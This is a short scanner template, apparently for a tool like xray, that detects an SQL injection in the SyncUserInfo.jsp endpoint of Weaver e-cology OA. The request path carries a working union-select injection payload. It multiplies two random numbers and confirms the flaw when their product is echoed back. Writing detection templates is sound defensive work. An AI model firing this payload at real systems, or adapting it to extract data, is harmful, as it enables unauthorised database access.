expression: r0()
id: e-cology-syncuserinfo-sqli
info:
  author: MaxSecurity(https://github.com/MaxSecurity)
  description: "\u6CDB\u5FAEOA e-cology syncuserinfo SQL\u6CE8\u5165\u6F0F\u6D1E app=\"\
    Weaver-OA\""
  name: "\u6CDB\u5FAEOA e-cology syncuserinfo SQL\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - https://www.weaver.com.cn/
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      * r2)))
    request:
      method: GET
      path: /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{r1}}*{{r2}}),null
set:
  r1: randomInt(40000, 44800)
  r2: randomInt(40000, 44800)
